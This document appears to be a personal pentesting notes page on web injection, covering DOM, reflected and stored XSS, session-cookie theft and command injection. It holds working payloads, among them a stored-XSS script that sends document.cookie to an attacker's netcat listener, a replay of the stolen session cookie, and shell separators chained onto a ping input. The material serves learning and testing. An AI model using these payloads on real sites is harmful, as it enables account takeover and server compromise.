---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Injection

Occurs when we find a way of sending html, css, js code, database petitions and others, via a petition or URL of a website.

## <mark style="color:purple;">Cross-site Scripting</mark>

* XSS scripting allows execution of  maliciuos code of javascript or any client-side language

### DOM-based

The html document of a page can be mutated

#### Example

* The URL shows changes of a parameter

<pre class="language-html" data-overflow="wrap" data-line-numbers><code class="lang-html">&#x3C;!-- We select language in a slider and is reflected on url -->
http://url/?language=en

&#x3C;!-- Check html of page for script tags and document.write() functions-->
...
&#x3C;select name="default">
<strong>  &#x3C;script>
</strong><strong>  ...
</strong>    document.write("&#x3C;option value='"+lang+"'>"+decodeURI(lang) + "&#x3C;/option>");
  ...
  &#x3C;/script>
&#x3C;/select>
...

&#x3C;!-- Use '> to close "value" parameter and then close tags -->
http://url?language='>&#x3C;/option>&#x3C;/select>   
&#x3C;!-- You will see all options of the slider are now displayed on screen -->

<strong>&#x3C;!-- Then create whatever tag -->
</strong>http://url?language='>&#x3C;/option>&#x3C;/select>&#x3C;h1>HACKED&#x3C;/h1>

&#x3C;!-- Abuse this to inject even js code -->
http://url?language='>&#x3C;/option>&#x3C;/select>&#x3C;script>if(window.confirm('HACKED\nTRY TO CALL FOR HELP?')){window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');};&#x3C;/script>
</code></pre>

***

* When script tag is being filtered

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Use image tag, putting a bad source cause a error, we handle it with 'onerror' parameter that let us insert JS Code
http://url?language='></option></select><img src=x onerror='alert("HACKED")'/>
```
{% endcode %}

***

### Reflected:&#x20;

When URL or form parameters are displayed on screen of the page

#### Example:

* A parameter sent in the query of the url is shown in screen

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash"># We made a get to http://url/?msg=Hello
# The site Return "Hello" in any part of the html
# Then we could do something like this to inject code
<strong>curl http://url/?msg=&#x3C;script>$payload&#x3C;/script>
</strong></code></pre>

***

* A parameter sent in the query of the url is shown in screen

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash"># We insert Hello in a formulary
# The site return "Hello" in any part of the html
# Then we could fill the form with code to inject
<strong>&#x3C;script>$payload&#x3C;/script>
</strong><strong>
</strong><strong>#Sometimes tag filter can be bypass using capital letters
</strong>&#x3C;SCRIPT>$payload&#x3C;/SCRIPT>

#Or using img tag
&#x3C;img src=x onerror='alert("HACKED")'/>
</code></pre>

***

### Stored:

The input of values is saved by the web and display to anyone who browse to the site. Maliciuos code in the same way will remain globally in the web site.

#### Example:

* A formulary show a list of entries

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We insert name and comment in the formulary
#Every time an insertion is done the website update a list with the entries that is displayed to every user
#Then we could fill the form to inject code
<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">CLICK HERE TO WIN A PRIZE</a>
```
{% endcode %}

***

### Secret disclosure:

When the application shows _Stored XSS_ vulnerability, we could try to hijkack cookies such as sessions tokens that are being stored on client-side

#### Example:

* By normal in an accessed session you can go to _Inspect>Application>Cookies_ tab and check the values being stored

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```
Name               Value                              HttpOnly
...                ...                                ...
PHPIDSESSID        e15df96b271a9729837c2bb206b522c7
...                ...                                ...
```
{% endcode %}

{% hint style="info" %}
* `HttpOnly` tag unmarked, indicates that the cookie can interact with JavaScript code
* `PHPIDSESSID` is the default session cookie on php handled pages
{% endhint %}

***

{% hint style="info" %}
We can assume that is configurated this way and try to get the cookie values by force
{% endhint %}

***

* On host machine set up a listener port with netcat

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
nc -nlvp $port
```
{% endcode %}

***

* Make a cookie hijacking using the Stored XSS vulnerable part

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#Fill the form with the payload
<script>fetch("$IP:$port" + document.cookie);</script>
#This will get the information of the cookie values
```
{% endcode %}

{% hint style="info" %}
The `$IP` and `$port` values are from your machine and the port opened with _netcat_
{% endhint %}

***

* Once you have the cookie value go to the website page, go to _Inspect>Application>Cookies_ tab, set the cookie value and reload the page

```bash
Name               Value                             
...                ...                                
PHPIDSESSID        $hijackedCookie     #We set the cookie obtained   
...                ...
#This will log you in the session we stealed without need of credentials
```

***



## <mark style="color:purple;">SQL Injection</mark>

* Poisoning estructured database queries based on SQL with the user input
* To know more about this type of injection you can go [here](../../database-attacks/sql-injection.md)



## <mark style="color:purple;">Command injection</mark>

* Abuse user inputs on page to execute commands on the server of an application

#### Example

* When internally is being used use the _system()_ function

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We send a petition with cmd=$command, this will let us now if we can have access to a terminal of the machine
curl -X POST http://url/? -d "cmd=whoami"
#Is possibly being handled by system() and will give the user on the response
```
{% endcode %}

#### Example 2:

* The aplication receive input for internal server commands

{% code overflow="wrap" lineNumbers="true" %}
```bash
#An aplication makes pings and recieve the IP as input
8.8.8.8 #Input
#Example output
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=26.4 ms
...
#Works like the following command inside
ping -c4 $input
```
{% endcode %}

***

* Abuse input to add other commands

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">8.8.8.8; ls -la
#Try other options if is being filtered
<strong>8.8.8.8 &#x26; ls -la    
</strong>8.8.8.8 &#x26;&#x26; ls -la
8.8.8.8 | ls -la
8.8.8.8 || ls -la
</code></pre>

***

